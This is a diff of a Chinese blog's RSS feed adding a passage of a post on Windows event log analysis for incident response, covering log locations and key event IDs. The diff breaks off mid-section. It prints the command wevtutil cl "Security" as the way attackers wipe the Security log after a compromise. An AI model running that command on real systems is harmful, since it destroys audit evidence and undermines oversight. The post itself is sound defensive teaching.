@@ -7,7 +7,738 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Lsec&#39;s Blog</copyright>
-        <lastBuildDate>Tue, 24 Jun 2025 15:34:32 +0800</lastBuildDate><atom:link href="https://lserein.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Fri, 27 Jun 2025 00:54:44 +0800</lastBuildDate><atom:link href="https://lserein.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Windows日志分析</title>
+        <link>https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</link>
+        <pubDate>Fri, 27 Jun 2025 00:43:44 +0800</pubDate>
+        
+        <guid>https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;img src="https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/2.png" alt="Featured image of post Windows日志分析" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.yuque.com/juwangyizhu/tr4ndd/rwdtyo?singleDoc#aAVqA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;2. Windows系统日志审计详解&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;1事件日志分析&#34;&gt;1.事件日志分析
+&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;使用&lt;/strong&gt;&lt;font style=&#34;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&#34;&gt;eventvwr.msc打开事件查看器&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1.png&#34;
+	width=&#34;2377&#34;
+	height=&#34;759&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1_hu_8645a70dc80605b6.png 480w, https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1_hu_6fe2661e85447104.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;313&#34;
+		data-flex-basis=&#34;751px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;11事件日志类型&#34;&gt;1.1.事件日志类型
+&lt;/h2&gt;&lt;h3 id=&#34;应用程序日志&#34;&gt;&lt;font style=&#34;color:rgb(79, 79, 79);&#34;&gt;应用程序日志&lt;/font&gt;
+&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;应用程序日志包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;数据库程序可以在应用程序日志中记录文件错误&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;，程序开发人员可以自行决定监视哪些事件。如果某个&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;应用程序出现崩溃&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;默认存放路径：&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:#DF2A3F;background-color:rgb(238, 240, 244);&#34;&gt;C:\Windows\System32\Winevt\Logs\Application.evtx&lt;/font&gt;&lt;/p&gt;
+&lt;h3 id=&#34;系统日志&#34;&gt;&lt;font style=&#34;color:rgb(79, 79, 79);&#34;&gt;系统日志&lt;/font&gt;
+&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;系统日志记录操作系统组件产生的事件，主要包括&lt;/font&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;驱动程序、系统组件和应用软件的崩溃以及数据丢失错误&lt;/font&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;等&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:#DF2A3F;background-color:rgb(238, 240, 244);&#34;&gt;默认存放路径：C:\Windows\System32\Winevt\Logs\System.evtx&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;安全日志&#34;&gt;&lt;font style=&#34;color:rgb(79, 79, 79);&#34;&gt;安全日志&lt;/font&gt;
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;安全&lt;/font&gt;&lt;/strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://so.csdn.net/so/search?q=%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95&amp;amp;spm=1001.2101.3001.7020&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(252, 85, 49);&#34;&gt;日志记录&lt;/font&gt;&lt;/strong&gt;&lt;/a&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;默认存放路径：&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:#DF2A3F;background-color:rgb(238, 240, 244);&#34;&gt;C:\Windows\System32\Winevt\Logs\Security.evtx&lt;/font&gt;&lt;/p&gt;
+&lt;h3 id=&#34;windows-defind日志&#34;&gt;Windows Defind日志
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;如果Windows Defind查杀了某些工具，那么也会记录在日志中&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;默认存放路径：&lt;/strong&gt;&lt;font style=&#34;color:#DF2A3F;background-color:rgb(238, 240, 244);&#34;&gt;C:\Windows\System32\Winevt\Logs\Microsoft-Windows-Windows Defender%4Operational.evtx&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/2.png&#34;
+	width=&#34;2560&#34;
+	height=&#34;948&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/2_hu_3d858356176ba51a.png 480w, https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/2_hu_4bde7cc5a7967032.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;270&#34;
+		data-flex-basis=&#34;648px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;12常见事件id&#34;&gt;1.2.常见事件ID
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;事件ID&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;说明&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;备注&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1074&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;计算机开机&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;、&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;关机&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;、&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;重启的时间&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;、&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;原因&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;、&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;注释&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;查看异常关机情况&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1102&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;清理审计日志&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;发现篡改事件日志的用户&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4624&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;登录成功&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;检测异常的未经授权的登录&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4625&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;登陆失败&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;检测可能的暴力密码攻击&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4632&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;成员已添加到启用安全性的本地组&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;检测滥用授权用户行为&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4634&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;注销用户&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4648&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;试图使用显式凭据登录&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4657&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;注册表值被修改&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4663&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;尝试访问对象&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;检测未经授权访问文件和文件夹的行为&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CTF有些时候常考&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4672&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator超级管理员登录&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;（&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;被赋予特权&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;）&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4698&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;计划任务已创建&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4699&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;计划任务已删除&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4700&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;启用计划任务&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4701&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;禁用计划任务&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4702&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;更新计划任务&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4720&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;创建用户&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4726&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;删除用户&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4728&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;成员已添加到启用安全性的全局组&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;确保添加安全组成员的资格信息&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4740&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;锁定用户账户&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;检测可能的暴力密码攻击&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;4756&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;成员已添加到启用安全性的通用组&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;6005&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;表示日志服务已经启动&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;（&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;表明系统正常启动了&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;）&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;查看系统启动情况&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;6006&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;表示日志服务已经停止&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;（&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;如果在某天没看到6006事件&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;说明出现关机异常事件了&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;）&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;查看异常关机情况&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;6009&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;非正常关机&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;（&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctrl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;alt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;delete关机&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;）&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;5156&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;5158&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;出入站日志&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;（&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;很重要&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;）&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;12151565158出入站日志&#34;&gt;1.2.1.5156/5158出入站日志
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;当内网一台主机对你发起请求时，如Ping扫描就会记录在日志中，日志编号为5156&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/3.png&#34;
+	width=&#34;2100&#34;
+	height=&#34;898&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/3_hu_4528e45d3645bacb.png 480w, https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/3_hu_150b08b103abf365.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;233&#34;
+		data-flex-basis=&#34;561px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;1221102日志清除记录&#34;&gt;1.2.2.1102日志清除记录
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在windows中，若运维人员开启了记录所有安全日志项，那么攻击者在拿到该服务器权限后的所有操作都可以在该安全日志中被记录到。所以清空该Security日志肯定是一个善后的必然选择。&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;通过cmd清除日志&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wevtutil&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cl&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Security&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;在该日志事件中，执行日志清除动作的是system权限的账户，这肯定是有问题的。因为正常情况下普通用户是没有权限去清除日志的，除非绕过了UAC的普通账户，又或者是system权限的账户。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/4.png&#34;
+	width=&#34;1805&#34;
+	height=&#34;943&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/4_hu_998a06818b9beb0c.png 480w, https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/4_hu_679e0f6d32498380.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;191&#34;
+		data-flex-basis=&#34;459px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;12347204726账户管理记录&#34;&gt;1.2.3.4720/4726账户管理记录
+&lt;/h3&gt;&lt;p&gt;在安全日志4720中可以查看攻击者创建的用户，即使是隐藏用户都可以查看到。4726则是可以查看到被删除的用户。该事件日志中还可以查看该任务的发起者。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
